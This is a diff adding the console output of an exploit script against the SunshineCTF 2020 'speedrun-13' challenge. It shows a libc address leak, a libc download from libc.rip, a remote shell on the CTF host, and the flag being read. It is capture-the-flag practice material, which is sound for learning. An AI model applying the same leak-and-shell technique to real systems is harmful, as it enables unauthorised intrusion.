@@ -1,0 +1,27 @@
+# ./exploit_13.py REMOTE=1
+[*] '/pwd/datajerk/sunshinectf2020/speedrun-13/chall_13'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done
+[*] puts: 0xf7e2dcb0
+[*] getting: https://libc.rip/download/libc6_2.23-0ubuntu11.2_i386.so
+[*] '/pwd/datajerk/sunshinectf2020/speedrun-13/libc6_2.23-0ubuntu11.2_i386.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] libc.address: 0xf7dce000
+[*] Switching to interactive mode
+
+$ id
+uid=1000(chall_13) gid=1000(chall_13) groups=1000(chall_13)
+$ ls -l
+total 12
+-rwxr-xr-x 1 root root     7380 Nov  7 07:49 chall_13
+-rw-r----- 1 root chall_13   34 Nov  7 08:52 flag.txt
+$ cat flag.txt
+sun{almost-easy-61ddd735cf9053b0}
